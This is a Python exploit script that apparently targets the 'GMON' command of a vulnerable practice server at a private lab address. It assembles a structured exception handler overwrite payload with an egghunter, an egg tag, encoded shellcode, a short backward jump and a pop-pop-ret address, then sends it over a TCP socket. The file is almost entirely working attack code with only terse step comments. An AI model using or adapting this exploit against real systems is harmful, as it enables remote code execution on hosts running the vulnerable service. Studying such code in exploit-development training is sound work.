#!/usr/bin/python

import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

# Payload iterations
# 1 - find SEH overwrite
# 2 - Control what is put in the SEH
# 3 - Fill SEH with a pop pop ret
# 4 - Jump back to the location of our "A" (0x41)
# 5 - Store egghunter here

egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

shellcode =  b""
shellcode += b"\xd9\xe5\xbe\xc4\x4f\x77\xe2\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x53\x31\x73\x1a\x03\x73\x1a"
shellcode += b"\x83\xc3\x04\xe2\x31\xb3\x9f\x60\xb9\x4c\x60"
shellcode += b"\x05\x30\xa9\x51\x05\x26\xb9\xc2\xb5\x2d\xef"
shellcode += b"\xee\x3e\x63\x04\x64\x32\xab\x2b\xcd\xf9\x8d"
shellcode += b"\x02\xce\x52\xed\x05\x4c\xa9\x21\xe6\x6d\x62"
shellcode += b"\x34\xe7\xaa\x9f\xb4\xb5\x63\xeb\x6a\x2a\x07"
shellcode += b"\xa1\xb6\xc1\x5b\x27\xbe\x36\x2b\x46\xef\xe8"
shellcode += b"\x27\x11\x2f\x0a\xeb\x29\x66\x14\xe8\x14\x31"
shellcode += b"\xaf\xda\xe3\xc0\x79\x13\x0b\x6e\x44\x9b\xfe"
shellcode += b"\x6f\x80\x1c\xe1\x1a\xf8\x5e\x9c\x1c\x3f\x1c"
shellcode += b"\x7a\xa9\xa4\x86\x09\x09\x01\x36\xdd\xcf\xc2"
shellcode += b"\x34\xaa\x84\x8d\x58\x2d\x49\xa6\x65\xa6\x6c"
shellcode += b"\x69\xec\xfc\x4a\xad\xb4\xa7\xf3\xf4\x10\x09"
shellcode += b"\x0c\xe6\xfa\xf6\xa8\x6c\x16\xe2\xc1\x2e\x7f"
shellcode += b"\xc7\xeb\xd0\x7f\x4f\x7c\xa2\x4d\xd0\xd6\x2c"
shellcode += b"\xfe\x99\xf0\xab\x77\x8d\x03\x63\x3f\xde\xfa"
shellcode += b"\x84\x40\xf6\x38\xd0\x10\x60\xe9\x59\xfb\x70"
shellcode += b"\x16\x8c\x96\x7a\x80\xef\xcf\x01\xe0\x98\x0d"
shellcode += b"\xf6\x01\xe2\x9b\x10\x51\x44\xcc\x8c\x11\x34"
shellcode += b"\xac\x7c\xf9\x5e\x23\xa2\x19\x61\xe9\xcb\xb3"
shellcode += b"\x8e\x44\xa3\x2b\x36\xcd\x3f\xca\xb7\xdb\x45"
shellcode += b"\xcc\x3c\xee\xba\x82\xb4\x9b\xa8\xf2\xa2\x63"
shellcode += b"\x31\x02\x47\x64\x5b\x06\xc1\x33\xf3\x04\x34"
shellcode += b"\x73\x5c\xf7\x13\x07\x9b\x07\xe2\x3e\xd7\x31"
shellcode += b"\x70\x7f\x8f\x3d\x94\x7f\x4f\x6b\xfe\x7f\x27"
shellcode += b"\xcb\x5a\x2c\x52\x14\x77\x40\xcf\x80\x78\x31"
shellcode += b"\xa3\x03\x11\xbf\x9a\x63\xbe\x40\xc9\xf0\xb9"
shellcode += b"\xbf\x8f\xde\x61\xa8\x6f\x5e\x92\x28\x1a\x5e"
shellcode += b"\xc2\x40\xd1\x71\xed\xa0\x1a\x58\xa6\xa8\x91"
shellcode += b"\x0c\x04\x48\xa5\x05\xc8\xd4\xa6\xa9\xd1\xe7"
shellcode += b"\xdd\xc1\xe6\x07\x22\xc8\x82\x07\x22\xf5\xb4"
shellcode += b"\x34\xf4\xcf\xc2\x7b\xc4"

#seh  = "\xb3\x11\x50\x62"
#seh  = "\xef\x11\x50\x62"
seh  = "\xb4\x10\x50\x62"
# jmp back 40
#nseh = "\xeb\xd8\x90\x90"
# jmp back 50
nseh = "\xeb\xce\x90\x90"
egg  = "w00tw00t"

# 8
payload =  egg
# 32
payload += shellcode
payload += "A" * (3499 - len(payload))
payload += egghunter
payload += "A" * (3547 - len(payload))
payload += nseh
payload += seh
payload += "D" * (5000-len(payload))

#print("Delivering payload: " + payload)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.122.6", 9999))

s.send(command+payload)
s.recv(1024)
s.close()
